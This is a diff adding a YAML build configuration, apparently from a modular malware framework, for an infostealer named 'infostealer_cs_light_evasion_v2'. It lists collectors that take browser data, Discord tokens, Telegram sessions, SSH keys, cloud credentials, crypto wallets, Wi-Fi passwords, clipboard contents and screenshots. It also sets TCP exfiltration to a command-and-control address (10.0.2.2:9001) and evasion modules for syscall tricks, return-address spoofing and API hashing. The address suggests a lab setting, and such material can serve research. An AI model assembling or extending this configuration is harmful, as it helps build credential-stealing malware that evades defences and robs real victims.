@@ -1,0 +1,34 @@
+name: infostealer_cs_light_evasion_v2
+description: Full infostealer with all collectors, TCP exfil, sequential execution
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/installed_software
+- collectors/env_vars
+- collectors/clipboard
+- collectors/wifi_passwords
+- collectors/browser_chromium
+- collectors/discord_tokens
+- collectors/telegram_session
+- collectors/ftp_credentials
+- collectors/ssh_keys
+- collectors/cloud_creds
+- collectors/crypto_wallets
+- collectors/screenshot
+exfil: exfil/tcp_direct
+arch: arch/sequential
+resources: true
+evasion:
+- evasion/stack_strings
+- evasion/behavioral_pacing
+- evasion/indirect_syscall
+- evasion/syscall_knowndlls
+- evasion/ret_spoof
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
+api_resolve: api_resolve/api_hash_ror13
